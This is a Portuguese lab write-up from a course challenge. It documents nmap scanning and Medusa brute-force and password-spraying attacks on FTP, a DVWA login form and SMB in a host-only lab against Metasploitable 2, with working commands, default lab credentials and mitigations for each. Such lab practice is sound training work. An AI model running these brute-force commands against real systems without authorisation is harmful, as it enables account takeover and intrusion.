# Desafio DIO – Kali Linux + Medusa

Este repositório documenta a realização prática do desafio proposto pela DIO, utilizando **Kali Linux**, **Medusa** e ambientes vulneráveis como **Metasploitable 2** e **DVWA** para simular ataques de força bruta e testar medidas de mitigação.

---

## 🛠️ Configuração do Ambiente

### **1. Máquinas Virtuais Utilizadas**

* **Kali Linux** (atacante)
* **Metasploitable 2** (alvo principal)
* **DVWA** (aplicação web vulnerável)

### **2. Rede VirtualBox**

* Modo: **Host-Only**
* Comunicação direta entre Kali e Metasploitable
* Verificação com `ifconfig` e `ping`

---

## 🔥 Ataques Simulados

### ✔️ 1. Escaneamento Inicial

Comando utilizado:

```bash
nmap -sV -p 21,80,139,445 192.168.56.102
```

Este passo permitiu identificar serviços ativos: FTP, HTTP, SMB.

---
<img width="478" height="431" alt="nmap" src="https://github.com/user-attachments/assets/d81b4690-68ac-4d0a-baae-01e3c925b78f" />

### ✔️ 2. Ataque de Força Bruta em FTP

Comando utilizado:

```bash
medusa -h 192.168.56.102 -U user.txt -P password.txt -M ftp -f -v 6 -O ftp_result.txt
```

Login verificado com:

```bash
ftp 192.168.56.102
# Usuário: msfadmin
# Senha: msfadmin
```

Mitigações:

* Usar SFTP/SSH
* Minimizar serviços expostos
* Política de bloqueio após tentativas

---

<img width="950" height="432" alt="medusa" src="https://github.com/user-attachments/assets/8d20ba6b-9d59-4057-bb26-567fbeba29e1" />
<img width="344" height="192" alt="ftp" src="https://github.com/user-attachments/assets/07a4da9c-83f6-486c-bed1-956e762abff6" />

### ✔️ 3. Ataque HTTP (DVWA – Formulário Web)

Comando utilizado:

```bash
medusa -h 192.168.56.102 -U user.txt -P password.txt -M web-form \
  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login"
```

Validação manual:

```
http://192.168.56.102/dvwa
Usuário: admin
Senha: 123456
```

Mitigações:

* Captcha
* Limitar tentativas
* Bloqueio baseado em IP

---
<img width="960" height="299" alt="atack-form" src="https://github.com/user-attachments/assets/c1137d1f-090e-4849-a8e2-4128dbe3a22d" />
<img width="822" height="463" alt="dvwa" src="https://github.com/user-attachments/assets/ede64f3e-c5c8-4397-a469-5908e8c176f7" />
<img width="967" height="510" alt="acesso" src="https://github.com/user-attachments/assets/162d0aad-1bef-46c3-a237-691eabfd5ad7" />

### ✔️ 4. Password Spraying em SMB

Comando utilizado:

```bash
medusa -h 192.168.56.102 -U user.txt -P password.txt -M smbnt -f -v 6 -O smb_result.txt
```

Validação:

```bash
smbclient -L 192.168.56.102 -U msfadmin
# Senha: msfadmin
```

Mitigações:

* Desativar SMBv1
* Aplicar hardening
* Política forte de senhas
<img width="966" height="556" alt="smb" src="https://github.com/user-attachments/assets/639c10cc-fc98-4122-b399-1b31565ab316" />
<img width="774" height="330" alt="listasmb" src="https://github.com/user-attachments/assets/af906080-6831-4032-9751-90586892262c" />
